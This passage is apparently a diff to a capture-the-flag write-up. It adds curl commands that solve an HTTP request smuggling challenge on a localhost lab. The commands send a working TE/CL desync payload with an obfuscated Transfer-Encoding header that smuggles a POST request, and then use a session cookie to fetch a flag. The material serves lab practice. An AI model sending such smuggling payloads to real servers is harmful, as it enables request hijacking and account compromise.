@@ -59,3 +59,21 @@ Cookie: session=value
 > The solution may vary (not conceptually, but technically):
 > - The value of the Transfer-Encoding header may be different such as "asdchunked" or "1chunked" or any variation as long as it contains the word chunked.
 > - The chunk length varies according to the content of the smuggled request.
+
+
+# HUGO CURL SOLVE:
+
+### SMUGGLING
+```
+curl -X GET "http://localhost:8002/post/2" \
+    -H "Host: HOST:PORT" \
+    -H "Transfer-Encoding: containschunked" \
+    -H "Content-Length: 4" \
+    --data-binary $'75\r\nPOST /post/transmission HTTP/1.1\r\nHost: HOST:PORT\r\nContent-Length: 46\r\n\r\npostId=2&name=attacker&transmission=iamgroot\r\n0\r\n\r\n'
+```
+
+### Profile flag
+```
+curl -X GET "http://localhost:8002/profile" \
+    -H "Cookie: session=89bf520e29c9926597eb4669037b6f2e"
+```
